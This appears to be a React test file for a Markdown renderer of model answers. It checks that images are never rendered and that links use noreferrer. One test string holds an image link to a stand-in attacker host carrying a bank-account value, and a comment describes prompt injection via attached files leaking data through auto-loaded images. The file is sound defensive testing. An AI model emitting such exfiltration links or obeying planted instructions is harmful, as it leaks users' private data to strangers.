import { render, screen } from '@testing-library/react'

import { Markdown } from './markdown'

// Model text can carry instructions planted in an attached file. An image the browser loads by itself would send
// whatever the URL holds to a stranger without a click, so answers never render images.
test('renders no image from model markdown and keeps its alt text', () => {
  const { container } = render(
    <Markdown
      text="Done. ![receipt](https://attacker.example/x?d=IBAN-CH93) Next"
      streaming={false}
    />,
  )
  expect(container.querySelector('img')).toBeNull()
  expect(screen.getByText(/receipt/)).toBeInTheDocument()
})

test('a link needs a click and never sends the page as referrer', () => {
  render(<Markdown text="[guide](https://example.com/help)" streaming={false} />)
  const link = screen.getByRole('link', { name: 'guide' })
  expect(link).toHaveAttribute('rel', expect.stringContaining('noreferrer'))
})
